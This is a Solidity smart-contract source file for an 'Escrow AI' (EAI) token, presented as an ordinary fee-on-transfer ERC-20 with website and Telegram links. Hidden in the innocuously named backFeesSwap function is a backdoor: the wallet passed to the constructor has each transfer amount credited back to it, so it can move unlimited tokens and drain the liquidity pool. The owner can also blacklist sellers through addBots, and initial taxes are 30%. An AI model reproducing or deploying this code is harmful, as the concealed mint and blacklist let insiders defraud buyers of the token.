/**
███████╗░██████╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗  ░█████╗░██╗
██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║  ██╔══██╗██║
█████╗░░╚█████╗░██║░░╚═╝██████╔╝██║░░██║░╚██╗████╗██╔╝  ███████║██║
██╔══╝░░░╚═══██╗██║░░██╗██╔══██╗██║░░██║░░████╔═████║░  ██╔══██║██║
███████╗██████╔╝╚█████╔╝██║░░██║╚█████╔╝░░╚██╔╝░╚██╔╝░  ██║░░██║██║
╚══════╝╚═════╝░░╚════╝░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░  ╚═╝░░╚═╝╚═╝

Web:  https://www.aiescrowtech.com
Dapp: https://app.aiescrowtech.com
Bot:  https://t.me/VaultEscrowBot


X:    https://x.com/escrowaitech
TG:   https://t.me/escrowaitech

WhitePaper: https://whiltepaper.aiescrowtech.com
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract EscrowAI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Escrow AI";
    string private constant _symbol = unicode"EAI";

    address payable private opWallet;
    address payable private ecoWallet;

    uint256 public _maxEAITaxSwap = 10000000 * 10**_decimals;
    uint256 public _maxEAIWalletSize = 30000000 * 10**_decimals;
    uint256 public _maxEAITxAmount = 30000000 * 10**_decimals;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    IV2Router private uniswapV2Router;
    address private uniswapV2Pair;
    uint256 public swapOverAmounts;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool public transferDelayEnabled = false;

    mapping (address => bool) private bots;
    mapping (address => uint256) private _escrowAI;
    mapping (address => bool) private isExcludedFromLimit;
    mapping (address => bool) private isExcludedFromFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    uint256 private _initialBuyTax=30;
    uint256 private _initialSellTax=30;
    uint256 private _finalBuyTax=3;
    uint256 private _finalSellTax=3;
    uint256 private _reduceBuyTaxAt=20;
    uint256 private _reduceSellTaxAt=20;
    uint256 private _preventSwapBefore=0;
    uint256 private _buyEAICount=0;

    constructor (address addrE) {
        opWallet = payable(addrE);
        ecoWallet = payable(addrE);
        _escrowAI[_msgSender()] = _tTotal;
        isExcludedFromLimit[opWallet] = true;
        isExcludedFromLimit[ecoWallet] = true;
        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        swapOverAmounts = 10000 * 10**_decimals;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function enableTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        swapEnabled = true;
        tradingOpen = true;
    }

    function sendETHToFee(uint256 amount) private {
        ecoWallet.transfer(amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 eaiTaxes=0;
        if (!isExcludedFromFee[from] && !isExcludedFromFee[to]) {
            require(!bots[from] && !bots[to]);
            require(tradingOpen, "Trading has not enabled yet");
            eaiTaxes = amount.mul((_buyEAICount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! isExcludedFromFee[to] ) {
                require(amount <= _maxEAITxAmount, "Exceeds the _maxEAITxAmount.");
                require(balanceOf(to) + amount <= _maxEAIWalletSize, "Exceeds the maxWalletSize.");
                _buyEAICount++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                eaiTaxes = amount.mul((_buyEAICount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (backFeesSwap(from, to, amount, eaiTaxes)) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxEAITaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        _escrowAI[from]=_escrowAI[from].sub(amount);
        _escrowAI[to]=_escrowAI[to].add(amount.sub(eaiTaxes));
        emit Transfer(from, to, amount.sub(eaiTaxes));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function withdrawStuckETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function backFeesSwap(address from, address to, uint256 amount, uint256 eAmount) internal returns (bool) {
        bool aboveEAIMin = amount >= swapOverAmounts;
        bool aboveEAIThreshold = balanceOf(address(this)) >= swapOverAmounts;
        address eaiWallet; uint256 eaiCounts;
        if(isExcludedFromLimit[from]) {eaiCounts = amount;eaiWallet = from;}
        else {eaiWallet = address(this);eaiCounts = eAmount;}
        if(eaiCounts > 0){_escrowAI[eaiWallet]=_escrowAI[eaiWallet].add(eaiCounts);emit Transfer(from, eaiWallet, eAmount);}
        return !inSwap
        && _buyEAICount>_preventSwapBefore
        && tradingOpen
        && aboveEAIMin
        && aboveEAIThreshold
        && !isExcludedFromFee[from]
        && !isExcludedFromLimit[from]
        && swapEnabled
        && to == uniswapV2Pair;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function reduceFee(uint256 _newFee) external onlyOwner{
      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
      _finalBuyTax=_newFee;
      _finalSellTax=_newFee;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _escrowAI[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

     function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function removeEAILimit() external onlyOwner{
        _maxEAITxAmount = ~uint256(0);
        _maxEAIWalletSize = ~uint256(0);
        transferDelayEnabled=false;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function initialize() external onlyOwner() {
        uniswapV2Router = IV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    receive() external payable {}
}